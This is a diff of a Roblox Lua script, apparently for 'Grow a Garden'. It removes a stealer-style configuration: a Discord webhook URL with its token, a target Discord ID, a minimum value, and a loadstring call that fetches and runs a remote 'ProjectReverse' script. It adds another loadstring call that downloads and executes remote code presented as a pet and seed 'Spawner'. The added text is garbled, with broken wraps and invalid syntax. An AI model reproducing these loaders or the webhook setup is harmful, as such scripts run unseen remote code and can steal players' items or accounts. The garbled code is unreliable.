@@ -1,6 +1,14 @@
-Username = "san_zezo1"
-Webhook = "https://canary.discord.com/api/webhooks/1382771836500054177/4YzMuwvH6ayByhZDBr3St6H8PQb9JpZlj9WlzQjIQ_sG56wEjyVbbFUxzD-HDWX812db"
-MinimumValue = 25
-DiscordID = "493552172135612426"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinraScriptz/ProjectReverse/refs/heads/main/ProjectReverse"))()
+local Spawner =
+loadstring(game:HttpGet("https://
+codeberg.org/GrowAFilipino/
+GrowAGarden/raw/branch/main/ Spawner. lua")) ()
+Spawner. GetPets) -- Returns a table of supported pets
+Spawner. GetSeeds () -- Returns a table of supported seeds
+Spawner. GetEggs () -- Returns a table of supported eggs
+Spawner. SpawnPet ("Raccoon", 1, 2) --Spawns a Raccoon with 1 KG and 2 Age Spawner. SpawnSeed( "Candy Blossom") --
+Spawns Candy Blossom
+Spawner. SpawnEgg("Night Egg") --
+Spawns Night Egg
+Spawner. Spin("Sunflower") -- Spins
+Sunflower
+Spawner. Load() -- Loads the Default UI
